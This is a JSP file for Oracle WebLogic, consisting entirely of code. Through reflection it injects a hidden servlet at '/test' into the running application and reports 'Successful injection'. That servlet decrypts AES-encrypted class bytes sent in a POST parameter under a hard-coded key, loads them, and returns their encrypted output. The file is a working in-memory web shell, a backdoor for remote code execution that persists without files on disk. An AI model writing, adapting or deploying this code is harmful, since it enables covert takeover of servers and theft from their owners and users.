<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.IOException" %>
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@page import="javax.crypto.Cipher"%>


<%@page import="java.security.InvalidKeyException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="weblogic.servlet.internal.ServletStubImpl" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>


<html>
<head>
    <title>servletContext</title>
</head>
<body>
<%!
    class WeblogicServlet extends HttpServlet {
        String xc = "3c6e0b8a9c15224a";
        String pass = "pass";
        String md5 = md5(pass + xc);
        Class payload;

        public  String md5(String s) {
            String ret = null;
            try {
                java.security.MessageDigest m;
                m = java.security.MessageDigest.getInstance("MD5");
                m.update(s.getBytes(), 0, s.length());
                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
            } catch (Exception e) {
            }
            return ret;
        }

        public  String base64Encode(byte[] bs) throws Exception {
            Class base64;
            String value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
                value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public  byte[] base64Decode(String bs) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public byte[] x(byte[] s, boolean m) {
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
                return c.doFinal(s);
            } catch (Exception e) {
                return null;
            }
        }

        public Class defClass(byte[] classBytes) throws Throwable {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        }

        @Override
        public void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                byte[] data = base64Decode(req.getParameter(pass));
                data = x(data, false);
                if (payload == null) {
                    payload = defClass(data);
                } else {
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(req);
                    resp.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                    resp.getWriter().write(md5.substring(16));
                }
            } catch (Throwable e) {
            }
        }
    }
%>

<%
    String path = "/test";
    WebAppServletContext webAppServletContext = (WebAppServletContext)request.getServletContext();
    Method getServletMapping = webAppServletContext.getClass().getDeclaredMethod("getServletMapping");
    getServletMapping.setAccessible(true);
    Object servletMapping = getServletMapping.invoke(webAppServletContext);
    Method put = servletMapping.getClass().getDeclaredMethod("put", String.class, Object.class);
    WeblogicServlet weblogicServlet = new WeblogicServlet();

    Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
    ServletStubImplConstructor.setAccessible(true);
    ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(path, weblogicServlet, webAppServletContext);

    Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
    URLMatchHelperConstructor.setAccessible(true);
    Object umh = URLMatchHelperConstructor.newInstance(path, servletStub);

    put.invoke(servletMapping, path, umh);
    out.write("Successful injection ");
%>
</body>
</html>